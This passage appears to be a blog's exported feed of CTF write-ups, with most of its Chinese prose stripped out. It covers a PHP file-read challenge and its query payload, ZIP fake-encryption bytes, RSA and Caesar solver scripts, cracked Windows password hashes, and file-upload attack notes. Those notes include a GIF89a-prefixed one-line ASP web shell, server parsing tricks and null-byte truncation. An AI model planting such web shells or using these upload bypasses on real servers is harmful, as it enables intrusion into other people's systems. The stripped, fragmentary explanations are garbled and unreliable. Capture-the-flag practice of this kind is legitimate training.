variable">$_REQUEST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'first'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token variable">$second</span><span class="token operator">=</span><span class="token variable">$zero</span><span class="token operator">.</span><span class="token variable">$first</span><span class="token punctuation">;</span><span class="token comment">//zerofirst</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">preg_match_all</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"/Yeedo|wants|a|girl|friend|or|a|flag/i"</span><span class="token punctuation">,</span><span class="token variable">$second</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token variable">$key</span><span class="token operator">=</span><span class="token variable">$second</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"/\.\.|flag/"</span><span class="token punctuation">,</span><span class="token variable">$key</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"Noooood hacker!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span>        <span class="token variable">$third</span><span class="token operator">=</span><span class="token variable">$first</span><span class="token punctuation">;</span>        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"/\\|\056\160\150\x70/i"</span><span class="token punctuation">,</span><span class="token variable">$third</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token comment">//  |.php</span>            <span class="token variable">$end</span><span class="token operator">=</span><span class="token function">substr</span><span class="token punctuation">(</span><span class="token variable">$third</span><span class="token punctuation">,</span><span class="token number">5</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token function">base64_decode</span><span class="token punctuation">(</span><span class="token variable">$zero</span><span class="token punctuation">)</span><span class="token operator">.</span><span class="token variable">$end</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//maybe flag in flag.php</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span>    <span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span> </span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><strong>error_reporting(0)<strong><br>$REQUESTzerofirst<br>second&#x3D;zero.first<br>second</strong>&#x2F;Yeedo|wants|a|girl|friend|or|a|flag&#x2F;<strong><br>key&#x3D;second&#x3D;zero.first<br>key</strong>..<strong></strong>flag</strong><br>third&#x3D;first<br><strong>\056\160\150</strong><strong>\x70</strong><br>third**|.php<strong></strong>substr**endthird5base64zeroend</p><p><strong></strong></p><p>zerobase74flag(<strong>ZmxhZw&#x3D;&#x3D;</strong>)flagflag.phpflag.phpifflagbase64firstflagbase64zeroif**..<strong>first.phpsecondflag..phpsudstrfirst</strong>&#x2F;Yeedo|wants|a|girl|friend|or|a|flag&#x2F;<strong>first</strong>flag|.php**<br><strong>?zero&#x3D;ZmxhZw&#x3D;&#x3D;&amp;first&#x3D;flag|.php</strong></p><h3 id="x-y"><a href="#x-y" class="headerlink" title="x|y"></a>x|y</h3><p><strong>x|y x  y<br>z|food  z  food(z|f)ood  zood  food</strong></p>]]></content>
      
      
      <categories>
          
          <category> Bugku </category>
          
      </categories>
      
      
        <tags>
            
            <tag> ctf </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>python</title>
      <link href="/2023/01/13/python%E9%83%A8%E5%88%86%E7%9F%A5%E8%AF%86%E7%82%B9/"/>
      <url>/2023/01/13/python%E9%83%A8%E5%88%86%E7%9F%A5%E8%AF%86%E7%82%B9/</url>
      
        <content type="html"><![CDATA[<meta name="referrer" content="no-referrer"/><h2 id=""><a href="#" class="headerlink" title=""></a></h2><p><img src="https://img-blog.csdnimg.cn/8199ffcbcaed48d289971c6f7fcef868.png#pic_center" alt="1"></p><h2 id=""><a href="#" class="headerlink" title=""></a></h2><p><img src="https://img-blog.csdnimg.cn/931e8889a21040b7a22be771851fec85.png#pic_center" alt="2"></p><h2 id="whilefor"><a href="#whilefor" class="headerlink" title="whilefor"></a>whilefor</h2><p><img src="https://img-blog.csdnimg.cn/9e00c957396d443cb930f782490b7c06.png#pic_center" alt="3"></p><h2 id=""><a href="#" class="headerlink" title=""></a></h2><p><img src="https://img-blog.csdnimg.cn/6f36aeff3ac04f34ba832b2b58ecea21.png#pic_center" alt="1"></p>]]></content>
      
      
      <categories>
          
          <category>  </category>
          
      </categories>
      
      
        <tags>
            
            <tag> ptython </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>zip</title>
      <link href="/2023/01/10/zip%E4%BC%AA%E5%8A%A0%E5%AF%86/"/>
      <url>/2023/01/10/zip%E4%BC%AA%E5%8A%A0%E5%AF%86/</url>
      
        <content type="html"><![CDATA[<meta name="referrer" content="no-referrer"/><p><strong>zip</strong></p><p> ZIP <strong></strong></p><p>++</p><h2 id=""><a href="#" class="headerlink" title=""></a></h2><p>50 4B 03 040x04034b50</p><p>14 00 pkware </p><p>00 00</p><p>08 00</p><p>5A 7E</p><p>F7 46</p><p>16 B5 80 14CRC-321480B516</p><p>19 00 00 0025</p><p>17 00 00 0023</p><p>07 00</p><p>00 00</p><h2 id=""><a href="#" class="headerlink" title=""></a></h2><p>50 4B 01 02(0x02014b50)</p><p>3F 00 pkware </p><p>14 00 pkware </p><p>00 0009 00</p><p>08 00</p><p>5A 7E</p><p>F7 46</p><p>16 B5 80 14CRC-321480B516</p><p>19 00 00 0025</p><p>17 00 00 0023</p><p>07 00</p><p>24 00</p><p>00 00</p><p>00 00</p><p>00 00</p><p>20 00 00 00</p><p>00 00 00 00</p><h2 id=""><a href="#" class="headerlink" title=""></a></h2><p>50 4B 05 06</p><p>00 00</p><p>00 00</p><p>01 00</p><p>01 00</p><p>59 00 00 00</p><p>3E 00 00 00</p><p>00 00ZIP </p><p></p><p><strong></strong>50 4B 03 04</p><p><strong></strong></p><p>50 4B 01 02</p><p>3F 00 pkware  </p><p>14 00 pkware  </p><p>00 0009 00</p><p><strong></strong> 50 4B 05 06 </p><p><img src="https://img-blog.csdnimg.cn/b4f6011275304c798465c33b8b83a77e.png" alt="1"></p>]]></content>
      
      
      <categories>
          
          <category>  </category>
          
      </categories>
      
      
        <tags>
            
            <tag> ctf </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>buuctfMISC</title>
      <link href="/2023/01/10/buuctf%E4%B9%8BMISC/"/>
      <url>/2023/01/10/buuctf%E4%B9%8BMISC/</url>
      
        <content type="html"><![CDATA[<meta name="referrer" content="no-referrer"/><h2 id=""><a href="#" class="headerlink" title=""></a></h2><blockquote><p>&#x3D; &#x3D;  flag  flag{} </p></blockquote><p>flag.txt4ARCHPR<br><img src="https://img-blog.csdnimg.cn/c5332cec653f456dbf9d874b3cb7a2c3.png" alt="1"><br>base64flag</p><h2 id="wireshark"><a href="#wireshark" class="headerlink" title="wireshark"></a>wireshark</h2><blockquote><p>wireshark)  flag  flag{} </p></blockquote><p>pcap</p><blockquote><p> pcappcapHEX-EditorNotepad++16wiresharkwiresharkpcap</p></blockquote><p>HTTP postwiresharkpcaphttp,post<br><img src="https://img-blog.csdnimg.cn/2d8aee32f07a487d850f0b12fbd4e267.png" alt="1"><br><img src="https://img-blog.csdnimg.cn/6128dbdf6f9c4bbabe0e3ab4d8e36c64.png" alt="2"><br>flag.</p><h2 id="LSB"><a href="#LSB" class="headerlink" title="LSB"></a>LSB</h2><p>LSB</p><p><img src="https://img-blog.csdnimg.cn/64da9c8efb0a43d9b91316ee9b886da0.png" alt="1"></p><blockquote><p>LSBleastsignificant bitMLSB</p></blockquote><p>stegsolve<br><img src="https://img-blog.csdnimg.cn/ef28ba074c0f480fb77fdf873f929c14.png" alt="2"><br><br><img src="https://img-blog.csdnimg.cn/1f0756bb9f6e4fb6824fb3d4c92ef795.png" alt="3"><br>flag</p><h2 id="zip"><a href="#zip" class="headerlink" title="zip"></a>zip</h2><p>010editor<br><img src="https://img-blog.csdnimg.cn/81cfb24d08d3451580870b94ad0da351.png" alt="1"></p><p><img src="https://img-blog.csdnimg.cn/da5cdea1475a4986bf29cd72e26ecbf5.png" alt="2"><br><strong>09 0000 00</strong>flag<strong>flag{Adm1N-B2G-kU-SZIP}</strong></p>]]></content>
      
      
      <categories>
          
          <category> buuctf </category>
          
      </categories>
      
      
        <tags>
            
            <tag> ctf </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>buuctfcrypto</title>
      <link href="/2023/01/09/buuctf%E4%B9%8Bcrypto%E9%83%A8%E5%88%86%E8%A7%A3%E9%A2%98%E6%80%9D%E8%B7%AF/"/>
      <url>/2023/01/09/buuctf%E4%B9%8Bcrypto%E9%83%A8%E5%88%86%E8%A7%A3%E9%A2%98%E6%80%9D%E8%B7%AF/</url>
      
        <content type="html"><![CDATA[<meta name="referrer" content="no-referrer"/><h2 id=""><a href="#" class="headerlink" title=""></a></h2><p><strong></strong></p><blockquote><p><br><br><strong>FRPHEVGL</strong><br></p></blockquote><p><br>python</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">def</span> <span class="token function">decode</span><span class="token punctuation">(</span>secret<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token builtin">min</span><span class="token operator">=</span><span class="token builtin">ord</span><span class="token punctuation">(</span><span class="token string">"a"</span><span class="token punctuation">)</span>    <span class="token builtin">max</span><span class="token operator">=</span><span class="token builtin">ord</span><span class="token punctuation">(</span><span class="token string">"z"</span><span class="token punctuation">)</span>    <span class="token keyword">for</span> offset <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">26</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        plaint<span class="token operator">=</span><span class="token string">''</span>        <span class="token keyword">for</span> s <span class="token keyword">in</span> secret<span class="token punctuation">:</span>            o<span class="token operator">=</span><span class="token builtin">ord</span><span class="token punctuation">(</span>s<span class="token punctuation">)</span><span class="token operator">+</span>offset            o<span class="token operator">=</span><span class="token punctuation">(</span>o<span class="token operator">-</span><span class="token builtin">max</span><span class="token operator">+</span><span class="token builtin">min</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span> <span class="token keyword">if</span> o<span class="token operator">></span><span class="token builtin">max</span> <span class="token keyword">else</span> o            plaint<span class="token operator">+=</span><span class="token builtin">chr</span><span class="token punctuation">(</span>o<span class="token punctuation">)</span>        <span class="token keyword">print</span><span class="token punctuation">(</span>plaint<span class="token punctuation">,</span>offset<span class="token punctuation">)</span>str_secret<span class="token operator">=</span><span class="token string">'FRPHEVGL'</span><span class="token punctuation">.</span>lower<span class="token punctuation">(</span><span class="token punctuation">)</span>decode<span class="token punctuation">(</span>str_secret<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p></p><blockquote><p>frphevgl 0<br>gsqifwhm 1<br>htrjgxin 2<br>iuskhyjo 3<br>jvtlizkp 4<br>kwumjalq 5<br>lxvnkbmr 6<br>mywolcns 7<br>nzxpmdot 8<br>oayqnepu 9<br>pbzrofqv 10<br>qcaspgrw 11<br>rdbtqhsx 12<br>security 13<br>tfdvsjuz 14<br>ugewtkva 15<br>vhfxulwb 16<br>wigyvmxc 17<br>xjhzwnyd 18<br>ykiaxoze 19<br>zljbypaf 20<br>amkczqbg 21<br>bnldarch 22<br>comebsdi 23<br>dpnfctej 24<br>eqogdufk 25</p></blockquote><p>13securityComeChina<br></p><p><img src="https://img-blog.csdnimg.cn/cc5d04de020147259e4ab27b26e5a941.png" alt="1"><br>P<strong>flag{PbzrPuvan}</strong></p><h2 id="rsarsa"><a href="#rsarsa" class="headerlink" title="rsarsa"></a>rsarsa</h2><blockquote><p>Math is cool! Use the RSA algorithm to decode the secret message, c, p, q, and e are parameters for the RSA algorithm.&#x2F;&#x2F; RSA c p q  e  RSA </p></blockquote><blockquote><p>p &#x3D;  9648423029010515676590551740010426534945737639235739800643989352039852507298491399561035009163427050370107570733633350911691280297777160200625281665378483<br>q &#x3D;  11874843837980297032092405848653656852760910154543380907650040190704283358909208578251063047732443992230647903887510065547947313543299303261986053486569407<br>e &#x3D;  65537<br>c &#x3D;  83208298995174604174773590298203639360540024871256126892889661345742403314929861939100492666605647316646576486526217457006376842280869728581726746401583705899941768214138742259689334840735633553053887641847651173776251820293087212885670180367406807406765923638973161375817392737747832762751690104423869019034</p></blockquote><blockquote><p>Use RSA to find the secret message&#x2F;&#x2F;RSA</p></blockquote><p>c,p,q,e,n&#x3D;p*q,M<br>python</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token triple-quoted-string string">'''p,q,e,c.d'''</span><span class="token keyword">import</span> gmpy2e <span class="token operator">=</span> <span class="token number">65537</span>p <span class="token operator">=</span> <span class="token number">9648423029010515676590551740010426534945737639235739800643989352039852507298491399561035009163427050370107570733633350911691280297777160200625281665378483</span>q <span class="token operator">=</span> <span class="token number">11874843837980297032092405848653656852760910154543380907650040190704283358909208578251063047732443992230647903887510065547947313543299303261986053486569407</span>n <span class="token operator">=</span> p <span class="token operator">*</span> q<span class="token comment"># </span>C <span class="token operator">=</span> <span class="token number">83208298995174604174773590298203639360540024871256126892889661345742403314929861939100492666605647316646576486526217457006376842280869728581726746401583705899941768214138742259689334840735633553053887641847651173776251820293087212885670180367406807406765923638973161375817392737747832762751690104423869019034</span>d <span class="token operator">=</span> gmpy2<span class="token punctuation">.</span>invert<span class="token punctuation">(</span>e<span class="token punctuation">,</span> <span class="token punctuation">(</span>p <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">)</span> <span class="token operator">*</span> <span class="token punctuation">(</span>q <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>d<span class="token punctuation">)</span><span class="token comment"># </span>M <span class="token operator">=</span> <span class="token builtin">pow</span><span class="token punctuation">(</span>C<span class="token punctuation">,</span> d<span class="token punctuation">,</span> n<span class="token punctuation">)</span>  <span class="token comment"># </span><span class="token keyword">print</span><span class="token punctuation">(</span>M<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>M5577446633554466577768879988<br><strong>flag{5577446633554466577768879988}</strong></p><h2 id="Windows"><a href="#Windows" class="headerlink" title="Windows"></a>Windows</h2><p></p><blockquote><p>Administrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::<br>ctf:1002:06af9108f2e1fecf144e2e8adef09efd:a7fcb22a88038f35a8f39d503e7f0062:::<br>Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::<br>SUPPORT_388945a0:1001:aad3b435b51404eeaad3b435b51404ee:bef14eee40dffbc345eeb3f58e290d56:::</p></blockquote><p>hash<strong>hash</strong><br><img src="https://img-blog.csdnimg.cn/93de742bfb504a6ebe0ea469b3fe75d1.png" alt="1"><br>MD5<strong>a7fcb22a88038f35a8f39d503e7f0062</strong><strong>good-luck</strong><a href="https://www.cmd5.com/">md5</a><br><strong>flag{good-luck}</strong></p><h2 id=""><a href="#" class="headerlink" title=""></a></h2><h3 id=""><a href="#" class="headerlink" title=""></a></h3><p><br>18351873SAViguer6800</p><h3 id=""><a href="#" class="headerlink" title=""></a></h3><p><br><br>DS-1600000</p><h3 id=""><a href="#" class="headerlink" title=""></a></h3><p>0001999915</p><p><strong>606046152623600817831216121621196386</strong><br><a href="https://dianma.bmcx.com/"></a></p><h2 id=""><a href="#" class="headerlink" title="!"></a>!</h2><p><strong>MTHJ{CUBCGXGUGXWREXIPOYAOEYFIGXWRXCHTKHFCOHCFDUCGTXZOHIXOEOWMEHZO}</strong>  flag  flag{} , flag{}<br>MTHJflag<a href="https://quipqiup.com/">quipqiup-cryptoquip</a><br><img src="https://img-blog.csdnimg.cn/b4fc789dba9a46a3a8ba4f652d38fa30.png" alt="1"><br></p><h2 id="-"><a href="#-" class="headerlink" title="  ()"></a>  ()</h2><p><img src="https://img-blog.csdnimg.cn/02203a19c57a41a38b98cea954fd1819.png" alt="1"><br><a href="http://www.metools.info/code/c90.html"></a><br><img src="https://img-blog.csdnimg.cn/0a53834bfbea4db2a0476a2124c505ea.png" alt="1"></p><h2 id="-"><a href="#-" class="headerlink" title="+"></a>+</h2><blockquote><p><br>       <strong></strong><strong></strong><strong></strong><strong></strong><strong></strong><strong></strong><strong></strong><strong></strong><br>       +<strong></strong></p><p>keyCTF{XXX}</p></blockquote><h3 id=""><a href="#" class="headerlink" title=""></a></h3><p><img src="https://img-blog.csdnimg.cn/f5fd3210364043a487187ee5536630fd.png" alt="1"><strong>60</strong></p><p>28 + (60) &gt; 88 &gt; X<br>30 + (60) &gt; 90 &gt; Z<br>23 + (60) &gt; 93 &gt; S<br>8 + (60) &gt; 68 &gt; D<br>17 + (60) &gt; 77 &gt; M<br>10 + (60) &gt; 70 &gt; F<br>16 + (60) &gt; 76 &gt; L<br>30 + (60) &gt; 90 &gt; Z</p><p><strong>XZSDMFLZ</strong><br>writeup<br></p><blockquote><p>fence:<br>[2, 4]:<br>2XMZFSLDZ<br>4XSMLZDFZ</p></blockquote><p><br>Caesar:<br>key #0: XMZFSLDZ<br>key #1: WLYERKCY<br>key #2: VKXDQJBX<br>key #3: UJWCPIAW<br>key #4: TIVBOHZV<br>key #5: <strong>SHUANGYU</strong><br>key #6: RGTZMFXT<br>key #7: QFSYLEWS<br>key #8: PERXKDVR<br>key #9: ODQWJCUQ<br>key #10: NCPVIBTP<br>key #11: MBOUHASO<br>key #12: LANTGZRN<br>key #13: KZMSFYQM<br>key #14: JYLREXPL<br>key #15: IXKQDWOK<br>key #16: HWJPCVNJ<br>key #17: GVIOBUMI<br>key #18: FUHNATLH<br>key #19: ETGMZSKG<br>key #20: DSFLYRJF<br>key #21: CREKXQIE<br>key #22: BQDJWPHD<br>key #23: APCIVOGC<br>key #24: ZOBHUNFB<br>key #25: YNAGTMEA</p><p>Caesar:<br>key #0: XSMLZDFZ<br>key #1: WRLKYCEY<br>key #2: VQKJXBDX<br>key #3: UPJIWACW<br>key #4: TOIHVZBV<br>key #5: SNHGUYAU<br>key #6: RMGFTXZT<br>key #7: QLFESWYS<br>key #8: PKEDRVXR<br>key #9: OJDCQUWQ<br>key #10: NICBPTVP<br>key #11: MHBAOSUO<br>key #12: LGAZNRTN<br>key #13: KFZYMQSM<br>key #14: JEYXLPRL<br>key #15: IDXWKOQK<br>key #16: HCWVJNPJ<br>key #17: GBVUIMOI<br>key #18: FAUTHLNH<br>key #19: EZTSGKMG<br>key #20: DYSRFJLF<br>key #21: CXRQEIKE<br>key #22: BWQPDHJD<br>key #23: AVPOCGIC<br>key #24: ZUONBFHB<br>key #25: YTNMAEGA</p><p><strong>flag{SHUANGYU}</strong></p><h2 id="RSA1"><a href="#RSA1" class="headerlink" title="RSA1"></a>RSA1</h2><blockquote><p>p &#x3D; 8637633767257008567099653486541091171320491509433615447539162437911244175885667806398411790524083553445158113502227745206205327690939504032994699902053229<br>q &#x3D; 12640674973996472769176047937170883420927050821480010581593137135372473880595613737337630629752577346147039284030082593490776630572584959954205336880228469<br>dp &#x3D; 6500795702216834621109042351193261530650043841056252930930949663358625016881832840728066026150264693076109354874099841380454881716097778307268116910582929<br>dq &#x3D; 783472263673553449019532580386470672380574033551303889137911760438881683674556098098256795673512201963002175438762767516968043599582527539160811120550041<br>c &#x3D; 24722305403887382073567316467649080662631552905960229399079107995602154418176056335800638887527614164073530437657085079676157350205351945222989351316076486573599576041978339872265925062764318536089007310270278526159678937431903862892400747915525118983959970607934142974736675784325993445942031372107342103852</p></blockquote><p></p><blockquote><p>c  m e m o d n cm^{e} mod n cmemodn m  c d m o d n mc^{d} mod n<br>mcdmodn  ( n ) &#x3D; ( p  1 )  ( q  1 ) (n)&#x3D;(p1)(q1)<br>(n)&#x3D;(p1)(q1) d  e  1 m o d  ( n ) de1 mod (n) de1mod(n) d<br>p  d m o d ( p  1 ) dpd mod (p1) dpdmod(p1) d q  d m o d ( q <br>1 ) dqd mod (q1) dqdmod(q1)</p></blockquote><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> libnum<span class="token keyword">def</span> <span class="token function">egcd</span><span class="token punctuation">(</span>a<span class="token punctuation">,</span> b<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>b <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">return</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> a    <span class="token keyword">else</span><span class="token punctuation">:</span>        x<span class="token punctuation">,</span> y<span class="token punctuation">,</span> q <span class="token operator">=</span> egcd<span class="token punctuation">(</span>b<span class="token punctuation">,</span> a <span class="token operator">%</span> b<span class="token punctuation">)</span>  <span class="token comment"># q = GCD(a, b) = GCD(b, a%b)</span>        x<span class="token punctuation">,</span> y <span class="token operator">=</span> y<span class="token punctuation">,</span> <span class="token punctuation">(</span>x <span class="token operator">-</span> <span class="token punctuation">(</span>a <span class="token operator">//</span> b<span class="token punctuation">)</span> <span class="token operator">*</span> y<span class="token punctuation">)</span>        <span class="token keyword">return</span> x<span class="token punctuation">,</span> y<span class="token punctuation">,</span> q<span class="token keyword">def</span> <span class="token function">mod_inv</span><span class="token punctuation">(</span>a<span class="token punctuation">,</span> b<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">return</span> egcd<span class="token punctuation">(</span>a<span class="token punctuation">,</span> b<span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">%</span> b  <span class="token comment"># ab</span>p <span class="token operator">=</span> <span class="token number">8637633767257008567099653486541091171320491509433615447539162437911244175885667806398411790524083553445158113502227745206205327690939504032994699902053229</span>q <span class="token operator">=</span> <span class="token number">12640674973996472769176047937170883420927050821480010581593137135372473880595613737337630629752577346147039284030082593490776630572584959954205336880228469</span>dp <span class="token operator">=</span> <span class="token number">6500795702216834621109042351193261530650043841056252930930949663358625016881832840728066026150264693076109354874099841380454881716097778307268116910582929</span>dq <span class="token operator">=</span> <span class="token number">783472263673553449019532580386470672380574033551303889137911760438881683674556098098256795673512201963002175438762767516968043599582527539160811120550041</span>c <span class="token operator">=</span> <span class="token number">24722305403887382073567316467649080662631552905960229399079107995602154418176056335800638887527614164073530437657085079676157350205351945222989351316076486573599576041978339872265925062764318536089007310270278526159678937431903862892400747915525118983959970607934142974736675784325993445942031372107342103852</span>invq<span class="token operator">=</span>mod_inv<span class="token punctuation">(</span>p<span class="token punctuation">,</span>q<span class="token punctuation">)</span>mp<span class="token operator">=</span><span class="token builtin">pow</span><span class="token punctuation">(</span>c<span class="token punctuation">,</span>dp<span class="token punctuation">,</span>p<span class="token punctuation">)</span>mq<span class="token operator">=</span><span class="token builtin">pow</span><span class="token punctuation">(</span>c<span class="token punctuation">,</span>dq<span class="token punctuation">,</span>q<span class="token punctuation">)</span>m<span class="token operator">=</span><span class="token punctuation">(</span><span class="token punctuation">(</span>mp<span class="token operator">-</span>mq<span class="token punctuation">)</span><span class="token operator">*</span>invq<span class="token operator">%</span>p<span class="token punctuation">)</span><span class="token operator">*</span>q<span class="token operator">+</span>mq<span class="token keyword">print</span><span class="token punctuation">(</span>libnum<span class="token punctuation">.</span>n2s<span class="token punctuation">(</span>m<span class="token punctuation">)</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><strong>noxCTF{W31c0m3_70_Ch1n470wn}</strong></p>]]></content>
      
      
      <categories>
          
          <category> crypto </category>
          
      </categories>
      
      
        <tags>
            
            <tag> ctf </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ASCII</title>
      <link href="/2023/01/09/ASCII%E7%A0%81%E5%AF%B9%E5%BA%94%E8%A1%A8/"/>
      <url>/2023/01/09/ASCII%E7%A0%81%E5%AF%B9%E5%BA%94%E8%A1%A8/</url>
      
        <content type="html"><![CDATA[<p> <strong>chr(9) tab    chr(10)    chr(13)     Chr(13)&amp;chr(10)      chr(32)     chr(34)     chr(39) </strong></p><p> <strong>chr(33) !    chr(34)     chr(35) #    chr(36) $    chr(37)  %    chr(38) &amp;    chr(39)     chr(40) (    chr(41)  )    chr(42) *<br> chr(43) +    chr(44) ,    chr(45) -    chr(46) .    chr(47) &#x2F;</strong></p><p> Chr(48) 0    Chr(49) 1    Chr(50) 2    Chr(51) 3     Chr(52) 4    Chr(53) 5    Chr(54) 6    Chr(55) 7     Chr(56) 8    Chr(57) 9</p><p> <strong>chr(58)      chr(59) ;    chr(60) &lt;    chr(61) &#x3D;    chr(62) &gt;    chr(63) ?    chr(64) @</strong></p><p> chr(65) A    chr(66) B    chr(67) C    chr(68) D     chr(69) E    chr(70) F    chr(71) G    chr(72) H      chr(73) I     chr(74) J<br> chr(75) K    chr(76) L     chr(77) M    chr(78) N    chr(79) O    chr(80) P     chr(81) Q    chr(82) R    chr(83) S    chr(84) T<br> chr(85) U    chr(86) V    chr(87) W    chr(88) X    chr(89) Y    chr(90) Z</p><p> <strong>chr(91) [    chr(92) \    chr(93) ]    chr(94) ^    chr(95) _    chr(96) &#96;</strong></p><p> chr(97) a    chr(98) b    chr(99) c    chr(100) d     chr(101) e    chr(102) f    chr(103) g    chr(104) h     chr(105) i<br> chr(106) j    chr(107) k    chr(108) l     chr(109) m    chr(110) n    chr(111) o    chr(112) p     chr(113) q    chr(114) r<br> chr(115) s    chr(116) t     chr(117) u    chr(118) v    chr(119) w    chr(120) x     chr(121) y    chr(122) z</p><p> <strong>chr(123) {    chr(124) |    chr(125) }    chr(126) ~     chr(127)     chr(128)     chr(153)    chr(169)       chr(174)</strong> </p>]]></content>
      
      
      <categories>
          
          <category>  </category>
          
      </categories>
      
      
        <tags>
            
            <tag> ctf </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title></title>
      <link href="/2023/01/05/%E6%96%87%E4%BB%B6%E8%A7%A3%E6%9E%90%EF%BC%8C%E6%96%87%E4%BB%B6%E5%A4%B4%E6%AC%BA%E9%AA%97/"/>
      <url>/2023/01/05/%E6%96%87%E4%BB%B6%E8%A7%A3%E6%9E%90%EF%BC%8C%E6%96%87%E4%BB%B6%E5%A4%B4%E6%AC%BA%E9%AA%97/</url>
      
        <content type="html"><![CDATA[<meta name="referrer" content="no-referrer"/><h1 id=""><a href="#" class="headerlink" title=""></a></h1><p>iisapachenginx</p><h2 id="Iis"><a href="#Iis" class="headerlink" title="Iis"></a>Iis</h2><h3 id="1-"><a href="#1-" class="headerlink" title="1."></a>1.</h3><p>.asp.asaiisasp&#x2F;xxx.asp&#x2F;xx.jpg  xx.jpgaspshell</p><h3 id="2-"><a href="#2-" class="headerlink" title="2."></a>2.</h3><p>xxx.asp;.jpgxxx.jpg</p><h2 id="Apache"><a href="#Apache" class="headerlink" title="Apache"></a>Apache</h2><p>apachexxx.php.owf.rar .owf.rarapacheapachexxx.php.owf.rarphp.</p><p></p><h1 id=""><a href="#" class="headerlink" title=""></a></h1><p>gif89agif89a &lt;%eval request(xx)%&gt; xxx.jpgxx.gifwaf</p><p> <img src="https://img-blog.csdnimg.cn/bf55298bd8f14a2d8b8d9b9813ce976b.png" alt="5"></p><h2 id="00"><a href="#00" class="headerlink" title="00"></a>00</h2><p>00%00</p><p><img src="https://img-blog.csdnimg.cn/7a82003694db4edcb8fbde4e1e0f3aa8.png" alt="1"></p><p>%00</p><p><img src="https://img-blog.csdnimg.cn/e8560e2da51d4cb28d0118f8137af159.png" alt="2"></p><p>16</p><p> <img src="https://img-blog.csdnimg.cn/0e98b39607174575864baa6e3fb4cda2.png" alt="3"></p><p></p><p><img src="https://img-blog.csdnimg.cn/2cda82f915804842b99f150d56196ea0.png" alt="4"></p>]]></content>
      
      
      <categories>
          
          <category>  </category>
          
      </categories>
      
      
        <tags>
            
            <tag> ctf </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>buuctf-web</title>
      <link href="/2023/01/03/buuctf-web%E9%83%A8%E5%88%86%E5%81%9A%E9%A2%98%E8%AE%B0%E5%BD%95/"/>
      <url>/2023/01/03/buuctf-web%E9%83%A8%E5%88%86%E5%81%9A%E9%A2%98%E8%AE%B0%E5%BD%95/</url>
      
